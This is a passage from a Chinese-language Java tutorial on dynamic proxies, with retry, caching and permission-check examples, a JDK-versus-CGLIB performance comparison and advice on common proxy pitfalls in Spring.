                    Arrays.stream(retryExceptions).anyMatch(ex -&gt; ex.isInstance(cause));

                <span class="hljs-keyword">if</span> (!shouldRetry || attempt &gt;= maxAttempts) {
                    System.out.println(<span class="hljs-string">"[重试代理] 重试失败: "</span> + cause.getMessage());
                    <span class="hljs-keyword">throw</span> cause;
                }

                lastException = cause;
                System.out.println(<span class="hljs-string">"[重试代理] 执行失败，"</span> + delay + <span class="hljs-string">"ms后重试: "</span> + cause.getMessage());

                <span class="hljs-keyword">try</span> {
                    Thread.sleep(delay);
                } <span class="hljs-keyword">catch</span> (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">throw</span> cause;
                }
            }
        }

        <span class="hljs-keyword">throw</span> lastException;
    }
}

<span class="hljs-comment">/**
 * 远程服务（演示重试）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">callCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

    <span class="hljs-meta">@Retryable(maxAttempts = 3, delay = 500)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callRemoteApi</span><span class="hljs-params">(String param)</span> {
        callCount++;
        System.out.println(<span class="hljs-string">"调用远程API，第"</span> + callCount + <span class="hljs-string">"次"</span>);

        <span class="hljs-comment">// 模拟偶发失败</span>
        <span class="hljs-keyword">if</span> (callCount &lt; <span class="hljs-number">3</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"网络超时"</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-string">"调用成功: "</span> + param;
    }
}

<span class="hljs-comment">/**
 * 使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">RemoteService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> RetryProxyFactory.createProxy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteService</span>());

        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> proxy.callRemoteApi(<span class="hljs-string">"test"</span>);
        System.out.println(<span class="hljs-string">"最终结果: "</span> + result);
    }
}
</code></pre>
<h4 data-id="heading-23">5.3 案例3：缓存代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 缓存注解
 */</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Cacheable {
    String <span class="hljs-title function_">key</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">""</span>;
    <span class="hljs-type">int</span> <span class="hljs-title function_">expire</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">3600</span>;  <span class="hljs-comment">// 过期时间（秒）</span>
}

<span class="hljs-comment">/**
 * 缓存代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxyFactory</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, CacheEntry&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(T target)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(target.getClass());
        enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheInterceptor</span>(target));
        <span class="hljs-keyword">return</span> (T) enhancer.create();
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEntry</span> {
        Object value;
        <span class="hljs-type">long</span> expireTime;

        CacheEntry(Object value, <span class="hljs-type">int</span> expireSeconds) {
            <span class="hljs-built_in">this</span>.value = value;
            <span class="hljs-built_in">this</span>.expireTime = System.currentTimeMillis() + expireSeconds * <span class="hljs-number">1000L</span>;
        }

        <span class="hljs-type">boolean</span> <span class="hljs-title function_">isExpired</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> System.currentTimeMillis() &gt; expireTime;
        }
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

        <span class="hljs-keyword">private</span> Object target;

        CacheInterceptor(Object target) {
            <span class="hljs-built_in">this</span>.target = target;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                               MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {

            <span class="hljs-comment">// 获取@Cacheable注解</span>
            <span class="hljs-type">Method</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> target.getClass().getMethod(
                method.getName(), method.getParameterTypes());
            <span class="hljs-type">Cacheable</span> <span class="hljs-variable">cacheable</span> <span class="hljs-operator">=</span> targetMethod.getAnnotation(Cacheable.class);

            <span class="hljs-keyword">if</span> (cacheable == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> proxy.invokeSuper(obj, args);
            }

            <span class="hljs-comment">// 构建缓存key</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> buildCacheKey(cacheable.key(), method, args);

            <span class="hljs-comment">// 尝试从缓存获取</span>
            <span class="hljs-type">CacheEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> cache.get(cacheKey);
            <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">null</span> &amp;&amp; !entry.isExpired()) {
                System.out.println(<span class="hljs-string">"[缓存代理] 缓存命中: "</span> + cacheKey);
                <span class="hljs-keyword">return</span> entry.value;
            }

            <span class="hljs-comment">// 缓存未命中，执行方法</span>
            System.out.println(<span class="hljs-string">"[缓存代理] 缓存未命中: "</span> + cacheKey);
            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> proxy.invokeSuper(obj, args);

            <span class="hljs-comment">// 存入缓存</span>
            <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) {
                cache.put(cacheKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEntry</span>(result, cacheable.expire()));
                System.out.println(<span class="hljs-string">"[缓存代理] 缓存写入: "</span> + cacheKey);
            }

            <span class="hljs-keyword">return</span> result;
        }

        <span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildCacheKey</span><span class="hljs-params">(String keyPattern, Method method, Object[] args)</span> {
            <span class="hljs-keyword">if</span> (keyPattern.isEmpty()) {
                <span class="hljs-comment">// 默认key：类名.方法名(参数)</span>
                <span class="hljs-keyword">return</span> method.getDeclaringClass().getSimpleName() + <span class="hljs-string">"."</span> +
                       method.getName() + <span class="hljs-string">"("</span> + Arrays.toString(args) + <span class="hljs-string">")"</span>;
            }

            <span class="hljs-comment">// 替换参数占位符</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keyPattern;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) {
                key = key.replace(<span class="hljs-string">"#p"</span> + i, String.valueOf(args[i]));
            }
            <span class="hljs-keyword">return</span> key;
        }
    }
}

<span class="hljs-comment">/**
 * 用户服务（带缓存）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedUserService</span> {

    <span class="hljs-meta">@Cacheable(key = "user:#p0", expire = 60)</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> {
        System.out.println(<span class="hljs-string">"从数据库查询用户: "</span> + id);
        <span class="hljs-comment">// 模拟数据库查询</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(id, <span class="hljs-string">"User"</span> + id);
    }

    <span class="hljs-meta">@Cacheable(expire = 300)</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findAll</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"从数据库查询所有用户"</span>);
        <span class="hljs-keyword">return</span> Arrays.asList(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1L</span>, <span class="hljs-string">"User1"</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">2L</span>, <span class="hljs-string">"User2"</span>)
        );
    }
}

<span class="hljs-comment">/**
 * 使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">CachedUserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> CacheProxyFactory.createProxy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CachedUserService</span>());

        <span class="hljs-comment">// 第一次调用，缓存未命中</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> proxy.findById(<span class="hljs-number">1L</span>);
        System.out.println(<span class="hljs-string">"查询结果: "</span> + user1);

        System.out.println();

        <span class="hljs-comment">// 第二次调用，缓存命中</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> proxy.findById(<span class="hljs-number">1L</span>);
        System.out.println(<span class="hljs-string">"查询结果: "</span> + user2);

        System.out.println();

        <span class="hljs-comment">// 不同参数，缓存未命中</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user3</span> <span class="hljs-operator">=</span> proxy.findById(<span class="hljs-number">2L</span>);
        System.out.println(<span class="hljs-string">"查询结果: "</span> + user3);
    }
}
</code></pre>
<h4 data-id="heading-24">5.4 案例4：权限校验代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 权限注解
 */</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> RequiresPermission {
    String[] value();
}

<span class="hljs-comment">/**
 * 用户上下文（模拟）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserContext</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;Set&lt;String&gt;&gt; permissions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPermissions</span><span class="hljs-params">(Set&lt;String&gt; perms)</span> {
        permissions.set(perms);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Set&lt;String&gt; <span class="hljs-title function_">getPermissions</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> permissions.get();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPermission</span><span class="hljs-params">(String permission)</span> {
        Set&lt;String&gt; perms = permissions.get();
        <span class="hljs-keyword">return</span> perms != <span class="hljs-literal">null</span> &amp;&amp; perms.contains(permission);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        permissions.remove();
    }
}

<span class="hljs-comment">/**
 * 权限代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionProxyFactory</span> {

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(T target)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(target.getClass());
        enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PermissionInterceptor</span>(target));
        <span class="hljs-keyword">return</span> (T) enhancer.create();
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

        <span class="hljs-keyword">private</span> Object target;

        PermissionInterceptor(Object target) {
            <span class="hljs-built_in">this</span>.target = target;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                               MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {

            <span class="hljs-comment">// 获取@RequiresPermission注解</span>
            <span class="hljs-type">Method</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> target.getClass().getMethod(
                method.getName(), method.getParameterTypes());
            <span class="hljs-type">RequiresPermission</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> targetMethod.getAnnotation(RequiresPermission.class);

            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) {
                String[] required = annotation.value();

                <span class="hljs-comment">// 检查权限</span>
                <span class="hljs-keyword">for</span> (String permission : required) {
                    <span class="hljs-keyword">if</span> (!UserContext.hasPermission(permission)) {
                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">"缺少权限: "</span> + permission);
                    }
                }

                System.out.println(<span class="hljs-string">"[权限代理] 权限校验通过: "</span> + Arrays.toString(required));
            }

            <span class="hljs-keyword">return</span> proxy.invokeSuper(obj, args);
        }
    }
}

<span class="hljs-comment">/**
 * 管理服务
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminService</span> {

    <span class="hljs-meta">@RequiresPermission("user:delete")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(Long userId)</span> {
        System.out.println(<span class="hljs-string">"删除用户: "</span> + userId);
    }

    <span class="hljs-meta">@RequiresPermission({"user:create", "user:update"})</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrUpdateUser</span><span class="hljs-params">(User user)</span> {
        System.out.println(<span class="hljs-string">"创建或更新用户: "</span> + user.getUsername());
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryUser</span><span class="hljs-params">(Long userId)</span> {
        System.out.println(<span class="hljs-string">"查询用户: "</span> + userId);
    }
}

<span class="hljs-comment">/**
 * 使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AdminService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> PermissionProxyFactory.createProxy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminService</span>());

        <span class="hljs-comment">// 设置用户权限</span>
        UserContext.setPermissions(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(Arrays.asList(<span class="hljs-string">"user:query"</span>, <span class="hljs-string">"user:create"</span>)));

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 无需权限的方法</span>
            proxy.queryUser(<span class="hljs-number">1L</span>);
            System.out.println();

            <span class="hljs-comment">// 权限不足</span>
            proxy.deleteUser(<span class="hljs-number">1L</span>);

        } <span class="hljs-keyword">catch</span> (SecurityException e) {
            System.out.println(<span class="hljs-string">"权限校验失败: "</span> + e.getMessage());
        }

        System.out.println();

        <span class="hljs-comment">// 添加权限后重试</span>
        UserContext.setPermissions(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(Arrays.asList(<span class="hljs-string">"user:delete"</span>)));
        proxy.deleteUser(<span class="hljs-number">1L</span>);

        UserContext.clear();
    }
}
</code></pre>
<h3 data-id="heading-25">六、性能对比</h3>
<h4 data-id="heading-26">6.1 JDK代理 vs CGLIB性能测试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 性能测试
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyPerformanceTest</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">ITERATIONS</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000000</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 预热</span>
        warmup();

        <span class="hljs-comment">// 测试直接调用</span>
        testDirectCall();

        <span class="hljs-comment">// 测试JDK代理</span>
        testJdkProxy();

        <span class="hljs-comment">// 测试CGLIB代理</span>
        testCglibProxy();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmup</span><span class="hljs-params">()</span> {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">jdkProxy</span> <span class="hljs-operator">=</span> createJdkProxy(target);
        <span class="hljs-type">UserService</span> <span class="hljs-variable">cglibProxy</span> <span class="hljs-operator">=</span> createCglibProxy(target);

        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
            target.findById(<span class="hljs-number">1L</span>);
            jdkProxy.findById(<span class="hljs-number">1L</span>);
            cglibProxy.findById(<span class="hljs-number">1L</span>);
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDirectCall</span><span class="hljs-params">()</span> {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();

        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ITERATIONS; i++) {
            target.findById(<span class="hljs-number">1L</span>);
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - start;

        System.out.println(<span class="hljs-string">"直接调用耗时: "</span> + duration + <span class="hljs-string">"ms"</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testJdkProxy</span><span class="hljs-params">()</span> {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> createJdkProxy(target);

        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ITERATIONS; i++) {
            proxy.findById(<span class="hljs-number">1L</span>);
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - start;

        System.out.println(<span class="hljs-string">"JDK代理耗时: "</span> + duration + <span class="hljs-string">"ms"</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCglibProxy</span><span class="hljs-params">()</span> {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> createCglibProxy(target);

        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ITERATIONS; i++) {
            proxy.findById(<span class="hljs-number">1L</span>);
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - start;

        System.out.println(<span class="hljs-string">"CGLIB代理耗时: "</span> + duration + <span class="hljs-string">"ms"</span>);
    }

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UserService <span class="hljs-title function_">createJdkProxy</span><span class="hljs-params">(UserService target)</span> {
        <span class="hljs-keyword">return</span> (UserService) Proxy.newProxyInstance(
            target.getClass().getClassLoader(),
            target.getClass().getInterfaces(),
            (proxy, method, args) -&gt; method.invoke(target, args)
        );
    }

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UserService <span class="hljs-title function_">createCglibProxy</span><span class="hljs-params">(UserService target)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(target.getClass());
        enhancer.setCallback((MethodInterceptor) (obj, method, args, proxy) -&gt;
            proxy.invokeSuper(obj, args));
        <span class="hljs-keyword">return</span> (UserService) enhancer.create();
    }
}
</code></pre>
<h4 data-id="heading-27">6.2 性能对比结果</h4>
<pre><code class="hljs language-markdown" lang="markdown">典型测试结果（100万次调用）
┌──────────────┬──────────┬─────────┐
│  调用方式     │  耗时     │  说明    │
├──────────────┼──────────┼─────────┤
│  直接调用     │  ~50ms   │  基准    │
│  JDK代理      │  ~150ms  │  约3倍   │
│  CGLIB代理    │  ~120ms  │  约2.4倍 │
└──────────────┴──────────┴─────────┘

说明：
<span class="hljs-bullet">1.</span> 现代JVM对JDK代理有优化
<span class="hljs-bullet">2.</span> CGLIB在方法调用上略快（使用FastClass）
<span class="hljs-bullet">3.</span> CGLIB创建代理类较慢（需要生成字节码）
<span class="hljs-bullet">4.</span> 实际业务中，代理开销通常可忽略
</code></pre>
<h3 data-id="heading-28">七、最佳实践</h3>
<h4 data-id="heading-29">7.1 选择代理方式</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 代理方式选择建议
 */</span>

<span class="hljs-comment">/*
1. 优先使用JDK代理
   - 面向接口编程
   - Spring默认选择
   - 更符合设计原则

2. 以下情况使用CGLIB代理
   - 目标类没有实现接口
   - 需要代理非接口方法
   - 性能敏感场景

3. Spring Boot 2.x默认使用CGLIB
   - spring.aop.proxy-target-class=true
*/</span>

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyRecommendation</span> {

    <span class="hljs-comment">// 推荐：面向接口编程</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> UserService <span class="hljs-title function_">userService</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();
    }

    <span class="hljs-comment">// 不推荐：直接注入实现类</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> UserServiceImpl <span class="hljs-title function_">userServiceImpl</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();
    }
}
</code></pre>
<h4 data-id="heading-30">7.2 避免常见问题</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 代理常见问题及解决方案
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyPitfalls</span> {

    <span class="hljs-comment">/**
     * 问题1：同类方法调用不走代理
     */</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outerMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ❌ 直接调用，不走代理</span>
        <span class="hljs-built_in">this</span>.innerMethod();
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">innerMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 事务不生效</span>
    }

    <span class="hljs-comment">// 解决方案1：注入自己</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProxyPitfalls self;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outerMethodFixed1</span><span class="hljs-params">()</span> {
        self.innerMethod();  <span class="hljs-comment">// ✓ 走代理</span>
    }

    <span class="hljs-comment">// 解决方案2：使用AopContext</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outerMethodFixed2</span><span class="hljs-params">()</span> {
        ((ProxyPitfalls) AopContext.currentProxy()).innerMethod();  <span class="hljs-comment">// ✓</span>
    }

    <span class="hljs-comment">/**
     * 问题2：final方法不能被代理
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// CGLIB无法代理final方法</span>
    }

    <span class="hljs-comment">/**
     * 问题3：private方法不能被代理
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">privateMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 任何代理都无法代理private方法</span>
    }
}

<span class="hljs-comment">/**
 * 启用AopContext
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAspectJAutoProxy(exposeProxy = true)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AopConfig</span> {
}
</code></pre>
<h4 data-id="heading-31">7.3 调试代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 代理调试技巧
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyDebug</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. 查看代理类名</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> createProxy();
        System.out.println(<span class="hljs-string">"代理类: "</span> + proxy.getClass().getName());

        <span class="hljs-comment">// 2. 判断是否为代理对象</span>
        System.out.println(<span class="hljs-string">"是JDK代理: "</span> + Proxy.isProxyClass(proxy.getClass()));
        System.out.println(<span class="hljs-string">"是CGLIB代理: "</span> + proxy.getClass().getName().contains(<span class="hljs-string">"$$"</span>));

        <span class="hljs-comment">// 3. 获取原始对象</span>
        <span class="hljs-keyword">if</span> (AopUtils.isAopProxy(proxy)) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> ((Advised) proxy).getTargetSource().getTarget();
                System.out.println(<span class="hljs-string">"目标对象: "</span> + target.getClass().getName());
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
            }
        }

        <span class="hljs-comment">// 4. 保存生成的代理类</span>
        <span class="hljs-comment">// JDK代理</span>
